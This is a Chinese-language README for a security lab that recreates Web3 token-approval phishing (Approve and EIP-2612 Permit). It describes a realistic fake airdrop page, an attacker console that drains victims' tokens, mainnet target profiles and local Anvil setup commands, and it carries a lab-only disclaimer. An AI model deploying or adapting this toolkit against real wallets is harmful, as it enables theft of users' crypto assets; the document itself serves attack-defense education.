# 案例二:Web3 授权钓鱼实验室(Approve / Permit 复现)

> 本目录是 TrapLab 的第二条案例线:在**自有内网实验室**里复现 Web3 授权钓鱼
> (Approve / EIP-2612 Permit)的完整攻击链——受害者侧逼真假空投站 + 攻击者侧收割台。
> 方法论:先以攻击者视角构建完整链路,再切防守者视角做检测点映射与对抗方案。
> 案例一(剪贴板守护)见仓库根 README 与 `clipper/README.md`。

> **免责声明**:仅用于**自有内网实验室**的安全教育与攻防演练。
> 默认目标档案为 Anvil 本地测试链 + 公开测试私钥,零真实资产;
> 切主网档案(如 `polygon-usdc`、`bsc-usdt`)前先读 `targets/` 内的实测注释与安全边界。
> **严禁**将服务暴露公网或指向任何真实用户——那正是本案例要演示的犯罪行为。

## 攻击原理

诱导受害者在恶意页面签署代币授权:

- **Approve**:一笔链上交易,把代币的花费授权交给攻击者地址;有 gas 成本,授权额度可无限。
- **Permit**(EIP-2612):一次 EIP-712 签名即完成授权,**免 gas、不出交易**,受害者感知更弱。

授权到手后,攻击者随时用 `transferFrom` 把受害者代币转空——这就是"收割"。
页面 100% 拟真、不含任何演示字样;安全边界由 [`docs/phishing-runbook.md`](docs/phishing-runbook.md)(本目录)与 `/admin` 横幅承载。

## 目录结构

| 路径 | 说明 |
|---|---|
| `phish_server.py` | 钓鱼实验室服务:GET `/` 受害者假空投站,GET `/admin?key=…` 攻击者收割台 |
| `phish_templates/` | 受害者页面模板(配置注入) |
| `drain.py` | 收割引擎:待收割清单、approve/permit 两种收割路径 |
| `targets/` | 目标档案:`<链+代币+页面文案>` 打包的实测 YAML(`anvil-default` / `polygon-usdc` / `bsc-usdt`,或自建) |
| `contracts/` | Foundry 工程,`PhishingToken.sol` 测试假币 |
| `config.example.yaml` | 配置模板(真实 `config.yaml` 含私钥,已 gitignore) |
| `lab/` | 演练收尾/清理脚本(如 `cleanup-payload.ps1`,清理演练残留) |

> 注:案例一的端到端演示脚本(`demo.py`、`e2e_platform.py`)在 `clipper/scripts/`,见 `clipper/README.md`。

## 快速开始(Anvil 本地链)

完整步骤见 [`docs/phishing-runbook.md`](docs/phishing-runbook.md),概要:

```bash
anvil --chain-id 31337 --port 8546 &                      # 1. 起测试链
# 2. 部署假币:forge create PhishingToken(私钥用 Anvil 公开测试钥,完整命令见 runbook 第 1 节)
cd phishlab/contracts && forge create PhishingToken --broadcast --private-key <Anvil测试钥> --rpc-url http://127.0.0.1:8546
cp config.example.yaml config.yaml                        # 3. 配置(填假币地址,target: anvil-default)
uv run python phishlab/phish_server.py --config phishlab/config.yaml   # 4. 起钓鱼实验室
```

- 受害者:`http://localhost:8088/` — 连钱包 →「立即领取」(Approve 交易)或「免 Gas 领取」(Permit 签名)
- 攻击者:`http://localhost:8088/admin?key=traplab` — 事件流 → 待收割清单 → 一键收割 → 受害者代币归零

## 新增目标代币/链

引擎与目标解耦:新增一套目标 = 在 `targets/` 产出一份 YAML(链三件套 rpc/chain_id/rpc_name、
代币合约地址与 permit 能力判定、页面文案),`config.yaml` 以 `target: <名>` 引用。
产出流程与实测方法论见 runbook 第 6 节及现有档案内的注释。
